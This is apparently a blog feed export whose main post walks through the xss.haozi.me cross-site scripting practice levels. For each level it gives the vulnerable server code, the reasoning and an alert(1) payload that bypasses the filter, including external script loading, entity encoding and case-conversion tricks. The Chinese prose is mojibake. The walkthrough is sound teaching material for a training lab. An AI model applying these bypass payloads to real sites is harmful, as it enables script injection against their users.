<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://www.segmentfault.com&quot;&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span>111<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">http://www.segmentfault.com&quot;&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)</span></span></span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.segmentfault.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span>111<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&quot;&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://www.segmentfault.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&amp;#39;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;quot;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">&#x27;&amp;#x2f&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src=&quot;<span class="subst">$&#123;escapeHtml(input)&#125;</span>&quot;&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;Invalid URL&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åŒæ ·è¦æ±‚è¾“å…¥çš„å€¼è¦ä»¥<code>https://www.segmentfault.com</code>å¼€å¤´ï¼Œä½†æ˜¯è¿‡æ»¤äº†<code>&amp; &#39; &quot; &lt; &gt; /</code>ï¼Œè¿™ä¸ªè¿‡æ»¤ã€‚</p>
<p>å‰é¢ç»™å‡ºçš„åŒ…å«alert(1);çš„jsæ–‡ä»¶å°±æ´¾ä¸Šç”¨åœºäº†ã€‚</p>
<p><img src="https://img.vim-cn.com/58/fb7123f5bdf3b2948b5e557755267ae58ff909.png" alt="p6"></p>
<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://www.segmentfault.com@xss.haozi.me/j.js</span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https:&amp;#x2f&amp;#x2fwww.segmentfault.com@xss.haozi.me&amp;#x2fj.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;h1&gt;<span class="subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå°†è¾“å…¥å€¼å…¨éƒ¨è½¬æ¢æˆäº†å¤§å†™ã€‚</p>
<ul>
<li>htmlæ ‡ç­¾ä¸åŒºåˆ†ï¼›</li>
<li>åŸŸåä¸åŒºåˆ†å¤§å°å†™</li>
<li>jsä¸¥æ ¼åŒºåˆ†å¤§å°å†™ã€‚</li>
</ul>
<p>å› æ­¤è¿™é‡Œå¯ä»¥åˆ©ç”¨htmlæ ‡ç­¾å¼•ç”¨å¤–éƒ¨jsèµ„æºï¼Œä½†æ˜¯è¿™é‡Œå¼•ç”¨å‰é¢ç»™çš„<a href="https://xss.haozi.me/j.js%E8%BF%98%E6%98%AF%E4%B8%8D%E8%A1%8C%EF%BC%8C%E6%A0%B9%E6%8D%AE%E5%AE%98%E6%96%B9%E8%A7%A3%E7%AD%94%EF%BC%8C%E9%9C%80%E8%A6%81%E5%BC%95%E7%94%A8https://www.segmentfault.com.haozi.me/j.js%E8%BF%99%E4%B8%AA%E9%93%BE%E6%8E%A5%E6%89%8D%E8%A1%8C%E2%80%A6%E6%97%A0%E8%AF%AD%E3%80%82">https://xss.haozi.me/j.jsè¿˜æ˜¯ä¸è¡Œï¼Œæ ¹æ®å®˜æ–¹è§£ç­”ï¼Œéœ€è¦å¼•ç”¨https://www.segmentfault.com.haozi.me/j.jsè¿™ä¸ªé“¾æ¥æ‰è¡Œâ€¦æ— è¯­ã€‚</a></p>
<p>è¿™é‡Œä¹Ÿå¯åˆ©ç”¨ç¼–ç æ¥è¿›è¡Œç»•è¿‡ï¼Œå¯¹jsä»£ç è¿›è¡Œç¼–ç å¤„ç†, è€Œhtmléƒ¨åˆ†ä¸å˜</p>
<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&quot;X&quot;</span> <span class="attr">ONERROR</span>=<span class="string">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41;</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/script/ig</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å°†scriptæ›¿æ¢ä¸ºç©ºï¼Œæ­£åˆ™å…¨å±€åŒ¹é…ä¸”ä¸åŒºåˆ†å¤§å°å†™.</p>
<p>è¿™é‡Œå¯ä»¥ç›´æ¥ç”¨ä¸Šä¸€é¢˜çš„payloadâ€¦ä¹Ÿå¯ä»¥åŒå†™scriptï¼Œå¼•ç”¨å¤–éƒ¨jsèµ„æºï¼ŒåŒæ ·è¿˜æ˜¯éœ€è¦å¼•ç”¨<a href="https://www.segmentfault.com.haozi.me/j.js%E8%BF%99%E4%B8%AA%E9%93%BE%E6%8E%A5%E6%89%8D%E8%A1%8C%E2%80%A6">https://www.segmentfault.com.haozi.me/j.jsè¿™ä¸ªé“¾æ¥æ‰è¡Œâ€¦</a></p>
<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&quot;X&quot;</span> <span class="attr">ONERROR</span>=<span class="string">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41;</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/[&lt;/&quot;&#x27;]/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert(&#x27;<span class="subst">$&#123;input&#125;</span>&#x27;)</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†<code>&lt; / &quot; &#39;</code>ï¼Œä½†inputçš„åœ°æ–¹å‰é¢æœ‰ä¸ª//ï¼Œè¿™æ˜¯jsçš„å•è¡Œæ³¨é‡Šç¬¦ï¼Œå¯ä»¥é€šè¿‡æ¢è¡Œæ¥ç ´åï¼Œç„¶åå†ç”¨<code>--&gt;</code>å°†åé¢çš„<code>&#39;)</code>æ³¨é‡Šæ‰ã€‚<code>&lt;!--</code>å’Œ<code>--&gt;</code>éƒ½å¯ä»¥åœ¨htmlçš„<code>script</code>æ ‡ç­¾é‡Œå•ç‹¬ä½¿ç”¨è¿›è¡Œå•è¡Œæ³¨é‡Š.ï¼Œè¿™é‡Œ<code>&lt;</code>è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ä½¿ç”¨<code>--&gt;</code></p>
<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">alert(1);</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">          <span class="comment">// alert(&#x27;</span></span></span><br><span class="line">alert(1);</span><br><span class="line">--&gt;&#x27;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">&#x27;&lt;_$1&#x27;</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åŒ¹é…ä»¥<code>&lt;</code>èµ·å§‹çš„å­—ç¬¦ï¼Œæ›¿æ¢ä¸º<code>&lt;_$1</code>ï¼Œå¹¶ä¸”æŠŠè¾“å…¥è½¬æ¢ä¸ºå¤§å†™ï¼Œè¿™æ ·è¿™æ ·çš„æ ‡ç­¾å°±éƒ½ç”¨ä¸äº†äº†ã€‚</p>
<p>æœ‰ä¸€ä¸ª<code>Å¿</code>å­—ç¬¦ï¼Œæ˜¯å¤è‹±è¯­ä¸­<code>s</code>çš„å†™æ³•ï¼ŒÅ¿<code>è½¬æ¢ä¸ºå¤§å†™åæ­£å¥½ä¸º</code>S<code>ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡æ­£åˆ™ä½¿ç”¨</code><script>`æ ‡ç­¾å¼•å¦‚å¤–éƒ¨js</p>
<p><img src="https://img.vim-cn.com/c9/50e3965a99573b9b6cfe500887a4d64287def6.png" alt="p7"></p>
<p><img src="https://img.vim-cn.com/fd/162d35a3d88ab40ad41fa5146383d9cd612ee2.png" alt="p8"></p>
<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;Å¿cript src=&quot;https://www.segmentfault.com.haozi.me/j.js&quot;&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">SRC</span>=<span class="string">&quot;HTTPS://WWW.SEGMENTFAULT.COM.HAOZI.ME/J.JS&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&amp;#39;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;quot;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">&#x27;&amp;#x2f;&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;img src Î¿nerrÎ¿r=&quot;console.error(&#x27;<span class="subst">$&#123;escapeHtml(input)&#125;</span>&#x27;)&quot;&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†<code>&amp; &#39; &quot; &lt; &gt; /</code>ï¼Œè½¬æ¢ä¸ºäº†htmlå®ä½“ç¼–ç ï¼Œä½†æ˜¯ç”±äºinput codeåœ¨imgæ ‡ç­¾å†…ï¼Œæ‰€ä»¥htmlå®ä½“ç¼–ç æ˜¯å¯ä»¥è¢«ç›´æ¥è§£æçš„ã€‚<br>æ‰€ä»¥é—­åˆå‰é¢çš„æ ‡ç­¾ï¼Œåœ¨æ„é€ è¯­å¥å³å¯ã€‚</p>
<p>console.error() æ–¹æ³•ç”¨äºè¾“å‡ºé”™è¯¯ä¿¡æ¯åˆ°æ§åˆ¶å°ã€‚</p>
<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#x27;);alert(&#x27;1</span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">&quot;console.error(&#x27;<span class="symbol">&amp;#39;</span>);alert(<span class="symbol">&amp;#39;</span>1&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">å®é™…ä¸Šå°±æ˜¯</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">&quot;console.error(&#x27;&#x27;);alert(&#x27;1&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  window.data = <span class="subst">$&#123;input&#125;</span></span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç”±äºinputæ˜¯åœ¨scriptæ ‡ç­¾é‡Œé¢ï¼Œä¸”æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œæ‰€ä»¥ç›´æ¥ç”¨ï¼›é—­åˆå‰é¢çš„è¯­å¥ï¼Œæ„é€ ä¸‹ä¸€æ¡è¯­å¥å³å¯ã€‚</p>
<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1;alert(1)</span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">window</span>.data = <span class="number">1</span>;alert(<span class="number">1</span>)</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeJs</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>(s)</span><br><span class="line">            .replace(<span class="regexp">/\\/g</span>, <span class="string">&#x27;\\\\&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/`/g</span>, <span class="string">&#x27;\\`&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;\\74&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;\\76&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">&#x27;\\/&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\n/g</span>, <span class="string">&#x27;\\n&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\r/g</span>, <span class="string">&#x27;\\r&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\t/g</span>, <span class="string">&#x27;\\t&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\f/g</span>, <span class="string">&#x27;\\f&#x27;</span>)</span><br><span class="line">            .replace(<span class="regexp">/\v/g</span>, <span class="string">&#x27;\\v&#x27;</span>)</span><br><span class="line">            <span class="comment">// .replace(/\b/g, &#x27;\\b&#x27;)</span></span><br><span class="line">            .replace(<span class="regexp">/\0/g</span>, <span class="string">&#x27;\\0&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  s = escapeJs(s)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  var url = &#x27;javascript:console.log(&quot;<span class="subst">$&#123;s&#125;</span>&quot;)&#x27;</span></span><br><span class="line"><span class="string">  var a = document.createElement(&#x27;a&#x27;)</span></span><br><span class="line"><span class="string">  a.href = url</span></span><br><span class="line"><span class="string">  document.body.appendChild(a)</span></span><br><span class="line"><span class="string">  a.click()</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç”¨åæ–œæ è½¬ä¹‰äº†ä¸€å †å­—ç¬¦ï¼Œä½†æ˜¯<code>&quot;</code>è¢«è½¬ä¹‰æˆ<code>\&quot;</code>æ­£å¥½å¯ä»¥é—­åˆ<code>console.log(&quot;\&quot;)</code>ï¼Œæ—¢ç„¶é—­åˆäº†å‰é¢çš„è¯­å¥é‚£ä¹ˆä¹‹åå°±æ„é€ åé¢çš„è¯­å¥å°±è¡Œäº†ã€‚</p>
<p>console.log() æ–¹æ³•ç”¨äºåœ¨æ§åˆ¶å°è¾“å‡ºä¿¡æ¯ã€‚</p>
<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;),alert(1)(&quot;</span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> url = <span class="string">&#x27;javascript:console.log(&quot;\&quot;),alert(1)(\&quot;&quot;)&#x27;</span></span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">&#x27;a&#x27;</span>)</span></span><br><span class="line">  a.href = url</span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.body.appendChild(a)</span></span><br><span class="line">  a.click()</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h1><p><strong>server code:</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = s.replace(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s + <span class="string">&#x27;&quot;);&lt;/script&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åŒ¹é…<code>&quot;</code>æ›¿æ¢ä¸º<code>\&quot;</code>ï¼Œè¿™é‡Œç›´æ¥ç”¨<code>\&quot;)</code>é—­åˆå‰é¢çš„åŒå¼•å·ä¼šè¢«è½¬ä¹‰ï¼Œæ‰€ä»¥åœ¨åŠ ä¸€ä¸ª<code>\</code>æ¥è½¬ä¹‰<code>\</code>å³å¯ã€‚</p>
<p><strong>input code:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">\&quot;);alert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>html:</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&quot;\\&quot;</span>);alert(<span class="number">1</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>&quot;);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>xss</category>
      </categories>
  </entry>
  <entry>
    <title>å…³äºä¿¡æ¯æ”¶é›†</title>
    <url>/2021/05/26/%E5%85%B3%E4%BA%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>

<p>[TOC]</p>
<h1 id="åŸŸåä¿¡æ¯æ”¶é›†"><a href="#åŸŸåä¿¡æ¯æ”¶é›†" class="headerlink" title="åŸŸåä¿¡æ¯æ”¶é›†"></a>åŸŸåä¿¡æ¯æ”¶é›†</h1><h2 id="åŸŸåä»‹ç»"><a href="#åŸŸåä»‹ç»" class="headerlink" title="åŸŸåä»‹ç»"></a>åŸŸåä»‹ç»</h2><h2 id="whoisä»‹ç»"><a href="#whoisä»‹ç»" class="headerlink" title="whoisä»‹ç»"></a>whoisä»‹ç»</h2><h2 id="whoisæŸ¥è¯¢"><a href="#whoisæŸ¥è¯¢" class="headerlink" title="whoisæŸ¥è¯¢"></a>whoisæŸ¥è¯¢</h2><h2 id="å¤‡æ¡ˆä¿¡æ¯æŸ¥è¯¢"><a href="#å¤‡æ¡ˆä¿¡æ¯æŸ¥è¯¢" class="headerlink" title="å¤‡æ¡ˆä¿¡æ¯æŸ¥è¯¢"></a>å¤‡æ¡ˆä¿¡æ¯æŸ¥è¯¢</h2><h1 id="webç«™ç‚¹ä¿¡æ¯æ”¶é›†"><a href="#webç«™ç‚¹ä¿¡æ¯æ”¶é›†" class="headerlink" title="webç«™ç‚¹ä¿¡æ¯æ”¶é›†"></a>webç«™ç‚¹ä¿¡æ¯æ”¶é›†</h1><h1 id="ç«¯å£ä¿¡æ¯æ”¶é›†"><a href="#ç«¯å£ä¿¡æ¯æ”¶é›†" class="headerlink" title="ç«¯å£ä¿¡æ¯æ”¶é›†"></a>ç«¯å£ä¿¡æ¯æ”¶é›†</h1><h1 id="æ•æ„Ÿä¿¡æ¯æ”¶é›†"><a href="#æ•æ„Ÿä¿¡æ¯æ”¶é›†" class="headerlink" title="æ•æ„Ÿä¿¡æ¯æ”¶é›†"></a>æ•æ„Ÿä¿¡æ¯æ”¶é›†</h1><h1 id="çœŸå®IPåœ°å€æ”¶é›†"><a href="#çœŸå®IPåœ°å€æ”¶é›†" class="headerlink" title="çœŸå®IPåœ°å€æ”¶é›†"></a>çœŸå®IPåœ°å€æ”¶é›†</h1>]]></content>
      <tags>
        <tag>ä¿¡æ¯æ”¶é›†</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE</title>
    <url>/2021/07/18/xxe/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>

